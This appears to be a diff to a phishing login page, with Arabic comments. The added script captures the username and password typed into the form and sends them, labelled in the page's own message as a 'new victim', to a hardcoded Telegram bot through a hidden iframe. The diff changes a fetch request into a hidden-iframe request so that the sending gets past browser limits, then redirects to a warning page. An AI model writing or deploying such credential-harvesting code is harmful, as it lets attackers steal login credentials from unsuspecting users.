@@ -77,38 +77,33 @@
         </form>
     </div>
 
+    <!-- إطار مخفي لضمان إرسال البيانات لتليجرام بدون قيود المتصفح -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // استخراج البيانات المدخلة
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            // معلومات بوت تليجرام الخاص بك
             const botToken = "8677692095:AAF2WJhazxneecyzwripCch54k5m0npTEAo";
             const chatId = "7186101939";
+            const message = encodeURIComponent(`🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
 
-            // صياغة الرسالة
-            const message = `🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+            // إنشاء رابط الإرسال المباشر
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-            // إرسال البيانات إلى تليجرام
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => {
-                // الانتقال لصفحة التحذير بعد الإرسال
+            // إرسال الطلب عبر نافذة مخفية لضمان نجاحه
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = telegramUrl;
+            document.body.appendChild(iframe);
+
+            // الانتظار قليلاً ثم الانتقال لصفحة التحذير لضمان وصول الرسالة
+            setTimeout(function() {
                 window.location.href = "warning.html";
-            })
-            .catch(error => {
-                // الانتقال لصفحة التحذير حتى لو حدث خطأ في الاتصال
-                window.location.href = "warning.html";
-            });
+            }, 1000);
         });
     </script>
 
